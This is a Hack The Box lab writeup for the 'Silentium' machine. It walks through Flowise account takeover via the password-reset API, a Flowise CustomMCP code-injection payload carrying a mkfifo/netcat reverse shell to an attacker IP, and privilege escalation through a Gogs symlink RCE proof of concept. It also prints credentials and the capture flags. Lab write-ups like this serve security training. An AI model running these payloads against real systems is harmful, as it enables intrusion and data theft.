---
title: Silentium
description: This is a writeup for Silentium, an Easy-rated Linux machine from Hack The Box. This box focuses on exploiting a vulnerable web service and requires basic Linux enumeration for root "Gogs" service and get the flags.
date: 2026-05-09
toc: true
categories: [HTB, Writeup]
tags: [linux, easy, season 10, cve, web, api]
image: /assets/img/htb/silentium/Silentium_cover.png
---

{% include HTB_achievement.html id="867" %}

## Reconnaissance 
Perform an nmpa scan:
```shell
nmap -sC -sV -p- -oA nmap --min-rate 10000 10.129.59.176
```

```output
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-07 11:01 -0400
Nmap scan report for 10.129.59.176
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds
```

There is a redirection to `http://silentium.htb/`. Add it to `/etc/hosts` with the machine IP:
```shell
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.59.176   silentium.htb
```

## Enumeration - Hidden vhost 
Using  gobuster to enumerate sub-directory first, but with no good results. try to enumerate virtualhost like follow:
```shell
gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/big.txt --append-domain -t 100 -o gobuster
```

output:
![](Pasted%20image%2020260507180812.png)

Add this virtual host to the `hosts` file to access it
```shell
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.59.176   silentium.htb staging.silentium.htb
```

Here the page:
![](Pasted%20image%2020260507181156.png)
It can see in the title and in the code that this webserver running *Flowise* 

<div class="callout callout-info" markdown="1">
<div class="callout-title">ℹ️ Flowise info</div>

Flowise is a drag & drop user interface to build a customized large language model flow.
</div>

## Initial access - Flowise Account Takeover via Password Reset
There is no version, so It needed to try possible exploit to bypass, for the first step, the login page.
Search on internet It can be found this: 
<div class="callout callout-warning" markdown="1">
<div class="callout-title">⚠️ CVE-2025-58434</div>

is a critical authentication bypass vulnerability in Flowise, the popular drag-and-drop user interface for building customized large language model (LLM) flows. The vulnerability exists in the forgot-password endpoint, which improperly returns sensitive password reset tempToken values directly in API responses without authentication or verification. This broken access control flaw enables attackers to generate valid password reset tokens for arbitrary users, allowing complete account takeover (ATO) with no prior authentication required.
</div>

And metasploit offer this 2 exploit for this service:
![](Pasted%20image%2020260507190523.png)

There are also other exploit on github.

For proceed to use the first CVE, it needed to find a valid user. Searching on the main page of the web server, there is this:
![](Pasted%20image%2020260508102144.png)
let's try this user to reset the password and gain access through the tokens without verification.

<div class="callout callout-info" markdown="1">

The structure of the json it can be found with burp:
	![](Pasted%20image%2020260508104520.png)
	![](Pasted%20image%2020260508104706.png)
</div>

Request the reset token:
```shell
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb"}}'
```

```output
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 08 May 2026 08:31:11 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-eAWEXmFzC+aGHpVILzlUG+gC5C4"

{"user":
	{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73",
	"name":"admin",
	"email":"ben@silentium.htb",
	"credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
	"tempToken":"Rou9feK9pFWr0h5QiCsO0ri6H2uVYb8jmubW1RLq7pwSEvSNvMjDPthNO2Q4CUYa",
	"tokenExpiry":"2026-05-08T08:46:11.216Z",
	"status":"active",
	"createdDate":"2026-01-29T20:14:57.000Z",
	"updatedDate":"2026-05-08T08:31:11.000Z",
	"createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73",
	"updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},
	"organization":{},
	"organizationUser":{},
	"workspace":{},
	"workspaceUser":{},
	"role":{}
} 
```

now, with the token it can be reset the password through reset-password api: 
```shell
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb","tempToken":"G8HYsT4SQv56ECra6huOnEXk6gRKz4wKKyWtvJ8AougwXM8ApoNx6xeDjCd1II3k","password":"Password123"}}'
```

```output
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 08 May 2026 08:55:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 493
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"1ed-s/j9caGm7oRxbLeCGKTKXSuqBTs"

{"user":
	{
		"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73",
		"name":"admin",
		"email":"ben@silentium.htb",
		"credential":"$2a$05$6nIpp53a/Ymc3UyN1KfDo.lmYyDLreKVGFBTz9X91vnTU0jVYuNm2",
		"tempToken":"",
		"tokenExpiry":null,
		"status":"active",
		"createdDate":"2026-01-29T20:14:57.000Z",
		"updatedDate":"2026-05-08T08:55:24.000Z",
		"createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73",
		"updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"
	},
	"organization":{},
	"organizationUser":{},
	"workspace":{},
	"workspaceUser":{},
	"role":{}
} 
```
Got 201 code. try to access with new credential:
`ben@silentium.htb`:`Passowrd123!`

login also through the web page:
![](Pasted%20image%2020260508105914.png)

search around it can be found the real version of the service:
![](Pasted%20image%2020260508110003.png)
## Exploitation - Authenticated RCE & Docker Escape
Knowing this place us in a position to search others exploits and use it to got a RCE:
<div class="callout callout-warning" markdown="1">
<div class="callout-title">⚠️ CVE-2025-59528</div>

is a critical remote code execution vulnerability affecting Flowise, a popular drag-and-drop user interface for building customized large language model (LLM) flows. The vulnerability exists in version 3.0.5 where the CustomMCP node improperly handles user-provided configuration data, allowing attackers to execute arbitrary JavaScript code with full Node.js runtime privileges.
</div>
The CustomMCP node is designed to allow users to configure connections to external MCP (Model Context Protocol) servers. However, the convertToValidJSONString function within this component directly passes user-supplied input to the JavaScript Function() constructor without any security validation or sanitization. This dangerous pattern enables attackers to inject and execute malicious code that can access sensitive Node.js modules such as child_process and fs, leading to complete system compromise.

### Attack Vector
source: https://www.sentinelone.com/vulnerability-database/cve-2025-59528/
The attack vector is network-based and requires no authentication or user interaction. An attacker can craft a malicious mcpServerConfig payload containing JavaScript code that will be executed when processed by the vulnerable convertToValidJSONString function.

The attack flow involves:
1. An attacker identifies a Flowise instance running version 3.0.5 🟩
2. The attacker accesses the CustomMCP node configuration interface
3. A specially crafted configuration string containing malicious JavaScript is submitted as the mcpServerConfig parameter
	- payload 🟩
	```js
{
"loadMethod": "listActions",
  "inputs": {
	    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.233 4444 >/tmp/f');return 1;})()} )"
	}
}
	```
4. The server-side code passes this input to the Function() constructor
5. The malicious code executes with full Node.js privileges, allowing the attacker to spawn child processes, access the filesystem, or perform other malicious actions

API key to use for the above attack or JWT token:
![](Pasted%20image%2020260508153910.png)

```shell
curl -s -X POST http://staging.silentium.htb/api/v1/account/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"Password123!"}' | jq -r '.token'
```

<div class="callout callout-info" markdown="1">

Take in mind that it needed to find the `bearer token` with burp. read more about this [JSON Web Tokens (JWT) & Bearer Authentication](JSON%20Web%20Tokens%20(JWT)%20&%20Bearer%20Authentication.md)
</div>

Before starting the payload crafted, start the listener:
```shell
nc -lnvp 4444
```

Send the payload:
```shell
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
     -H "Content-Type: application/json" \
     -d @payload.json
```

And there it is:
![](Pasted%20image%2020260508193736.png)
## Post-Exploitation
![](Pasted%20image%2020260508203145.png)
we are root inside docker. Let's find some valid credential in docker environment:
![](Pasted%20image%2020260508203454.png)
possible password:
- F1l3_d0ck3r
- `r04D!!_R4ge`
try this password with ssh.the right one is the second
![](Pasted%20image%2020260508205032.png)

<div class="callout callout-tip" markdown="1">
<div class="callout-title">✔️ User Flag</div>

47e61c911e0fb92e7570c3cbf2ea2d43
</div>

## Privs escaletion
Try to enumerate and find something
```shell
systemctl list-unit-files --type=service --state=enabled
```

```output
UNIT FILE                              STATE   PRESET 
apparmor.service                       enabled enabled
apport.service                         enabled enabled
auditd.service                         enabled enabled
blk-availability.service               enabled enabled
console-setup.service                  enabled enabled
containerd.service                     enabled enabled
cron.service                           enabled enabled
dmesg.service                          enabled enabled
docker.service                         enabled enabled
e2scrub_reap.service                   enabled enabled
finalrd.service                        enabled enabled
getty@.service                         enabled enabled
gogs.service                           enabled enabled
gpu-manager.service                    enabled enabled
grub-common.service                    enabled enabled
grub-initrd-fallback.service           enabled enabled
keyboard-setup.service                 enabled enabled
lvm2-monitor.service                   enabled enabled
ModemManager.service                   enabled enabled
networkd-dispatcher.service            enabled enabled
networking.service                     enabled enabled
nginx.service                          enabled enabled
open-iscsi.service                     enabled enabled
open-vm-tools.service                  enabled enabled
pollinate.service                      enabled enabled
rsyslog.service                        enabled enabled
secureboot-db.service                  enabled enabled
setvtrgb.service                       enabled enabled
snapd.apparmor.service                 enabled enabled
snapd.autoimport.service               enabled enabled
snapd.core-fixup.service               enabled enabled
snapd.recovery-chooser-trigger.service enabled enabled
snapd.seeded.service                   enabled enabled
snapd.service                          enabled enabled
snapd.system-shutdown.service          enabled enabled
sysstat.service                        enabled enabled
systemd-pstore.service                 enabled enabled
systemd-resolved.service               enabled enabled
systemd-timesyncd.service              enabled enabled
thermald.service                       enabled enabled
ua-reboot-cmds.service                 enabled enabled
ubuntu-advantage.service               enabled enabled
ubuntu-fan.service                     enabled enabled
udisks2.service                        enabled enabled
vgauth.service                         enabled enabled

45 unit files listed.
```

This is the list of active services and an interesting find is *Gogs*:
<div class="callout callout-info" markdown="1">
<div class="callout-title">ℹ️ Gogs</div>

**Gogs** (short for "Go Git Service") is a self-hosted Git service. In simple terms, it is like running **your own private, lightweight version of GitHub or GitLab** directly on your Linux server.
### How to recognize it
</div>
If you are doing network enumeration (like on a Hack The Box machine) and you stumble across Gogs, here are the typical signatures:
>
>- **Default Web Port:** It almost always runs its web interface on port **3000** (e.g., `http://<target_ip>:3000`).
>- **Default SSH Port:** It usually binds to port **22** for Git SSH operations, or sometimes an alternate port like **2222** if the standard SSH daemon is already using 22.
>### Why it matters during a Penetration Test
If you just found Gogs running on a target machine, it is a massive point of interest. Source code repositories are absolute goldmines for attackers. Here is what you should immediately look for:
>
>1. **Open Registration:** Go to the web interface and see if "Sign Up" is enabled. If you can create your own account, you might instantly gain access to internal, public repositories hosted on the server.  
>2. **Explore Public Repos:** Even without an account, click the "Explore" tab. Developers often leave repositories set to Public by mistake.  
>3. **Hardcoded Secrets:** Once you can see the code, search through it for hardcoded passwords, database credentials, API keys, or hidden subdomains.
>4. **Version Vulnerabilities:** Look at the footer of the Gogs web page to find the version number. Older versions of Gogs have known vulnerabilities, including Remote Code Execution (RCE) and Server-Side Request Forgery (SSRF). You can use `searchsploit gogs` to check for specific exploits!

Search in which port is running gogs:
![](Pasted%20image%2020260509164624.png)
In this case the service run on port **3001**.

Searching around it can be found the PoC script in python for CVE-2025-8110:
<div class="callout callout-warning" markdown="1">
<div class="callout-title">⚠️ CVE-2025-8110</div>

a symlink-based RCE that allows an authenticated user to overwrite `.git/config` inside any repository, injecting an arbitrary `sshCommand` that executes when a privileged process runs `git push`.
PoC: https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit
</div>

access to the target machine via ssh with the following command to open e forward a tunnel directly to the server:
```shell
ssh -L 8080:127.0.0.1:3001 ben@silentium.htb
```

Now proceed with a manual attack (alternatively use the python script above):
![](Pasted%20image%2020260509170115.png)

Register a new account.
`user1`:`Password123`

Generate a new Token:
![](Pasted%20image%2020260509170611.png)
`9c9ab99c5ec6354733ccd234633abad25b56fcde`

Clone the script and run a listener.
Run the exploit script like follow on the attacker machine:
```python
python3 exploit.py \
  --url http://127.0.0.1:8080 \
  --username <user> \
  --password <pass> \
  --token <token> \
  --host <LHOST> \
  --port 4446
```

![637](Pasted%20image%2020260509174855.png)
Access gain, now search for the password:
![](Pasted%20image%2020260509175029.png)

<div class="callout callout-tip" markdown="1">
<div class="callout-title">✔️ Root flag</div>

564ed856c2da003072a004c99c9d9c3a
</div>

